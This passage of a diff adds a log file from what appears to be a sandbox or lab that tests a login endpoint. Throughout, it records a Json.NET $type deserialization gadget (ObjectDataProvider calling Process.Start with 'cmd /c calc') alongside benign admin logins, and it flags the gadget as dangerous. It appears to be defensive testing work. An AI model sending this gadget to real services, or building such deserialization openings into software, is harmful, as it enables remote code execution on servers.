+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 15:52:37: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 16:55:35: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 16:55:35: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 16:55:35: No suspicious content, returning original payload
+2025-06-23 16:55:36: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 16:55:36: Username: admin, Password: admin123
+2025-06-23 16:55:39: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 16:55:39: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 16:55:39: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 16:55:39: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 16:55:40: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-23 16:55:40: Username: , Password: dummy
+2025-06-23 16:57:05: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 16:57:13: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:04:15: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:04:15: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:04:15: No suspicious content, returning original payload
+2025-06-23 17:04:15: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:04:15: Username: admin, Password: admin123
+2025-06-23 17:04:22: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:04:22: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:04:22: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:04:22: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:04:22: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-23 17:04:22: Username: , Password: dummy
+2025-06-23 17:18:47: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:18:47: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:18:47: No suspicious content, returning original payload
+2025-06-23 17:18:48: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:18:48: Username: admin, Password: admin123
+2025-06-23 17:18:57: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:18:57: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:18:57: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:18:57: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:18:57: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-23 17:18:57: Username: , Password: dummy
+2025-06-23 17:23:29: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:23:29: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:23:29: No suspicious content, returning original payload
+2025-06-23 17:23:29: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-23 17:23:29: Username: admin, Password: admin123
+2025-06-23 17:23:32: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:23:32: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:23:32: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:23:32: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:23:33: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-23 17:23:33: Username: , Password: dummy
+2025-06-23 17:25:22: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:25:48: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-23 17:29:20: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-23 17:30:15: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 16:20:50: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 16:20:50: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 16:20:50: No suspicious content, returning original payload
+2025-06-24 16:20:50: Raw JSON: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 16:20:50: Username: admin, Password: admin123
+2025-06-24 16:20:55: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:20:55: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:20:55: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 16:20:55: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 16:20:55: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-24 16:20:55: Username: , Password: dummy
+2025-06-24 16:22:41: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:22:54: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:29:29: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:29:54: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:30:14: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-24 16:30:14: Username: , Password: dummy
+2025-06-24 16:44:47: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:44:48: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:44:48: Deserialized dangerous object: {
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+    "$values": [
+      "cmd",
+      "/c calc"
+    ]
+  },
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+  }
+}
+2025-06-24 16:44:48: Username: , Password: dummy
+2025-06-24 16:50:31: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 16:50:37: Raw JSON: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:06:38: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:06:38: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:06:38: Deserialized object with TypeNameHandling.None: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-24 17:06:38: Successfully decoded base64 for password: i٢�]�
+2025-06-24 17:06:39: Raw JSON: {
+  "username": "admin",
+  "password": "i٢�]�"
+}
+2025-06-24 17:06:39: Username: admin, Password: i٢�]�
+2025-06-24 17:06:42: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:06:42: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:06:42: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 17:06:42: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 17:06:43: Deserialized dangerous object: System.Windows.Data.ObjectDataProvider
+2025-06-24 17:06:43: Username: , Password: dummy
